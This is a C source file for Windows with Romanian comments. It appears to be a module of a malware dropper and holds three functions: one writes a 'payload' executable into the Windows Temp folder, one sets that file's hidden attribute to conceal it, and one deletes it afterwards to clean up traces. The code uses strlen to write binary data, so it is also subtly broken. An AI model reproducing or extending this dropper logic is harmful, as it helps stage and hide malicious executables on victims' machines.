#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "temp_files.h"
#include "utils.h"

// Cale către fișierul temporar (poate fi ajustată)
#define TEMP_PAYLOAD_PATH "C:\\Windows\\Temp\\payload_tmp.exe"

// Creează un fișier temporar care conține payload-ul specificat
void create_temp_payload(const char *payload_data) {
    FILE *file = fopen(TEMP_PAYLOAD_PATH, "wb");
    if (file == NULL) {
        log_event("Failed to create temporary payload file.");
        return;
    }

    fwrite(payload_data, sizeof(char), strlen(payload_data), file);
    fclose(file);
    log_event("Temporary payload file created.");
}

// Ascunde fișierul temporar, setând atributul "hidden"
void hide_temp_files() {
    if (SetFileAttributes(TEMP_PAYLOAD_PATH, FILE_ATTRIBUTE_HIDDEN) == 0) {
        log_event("Failed to hide temporary payload file.");
    } else {
        log_event("Temporary payload file hidden.");
    }
}

// Șterge fișierul temporar
void delete_temp_files() {
    if (DeleteFile(TEMP_PAYLOAD_PATH) == 0) {
        log_event("Failed to delete temporary payload file.");
    } else {
        log_event("Temporary payload file deleted.");
    }
}
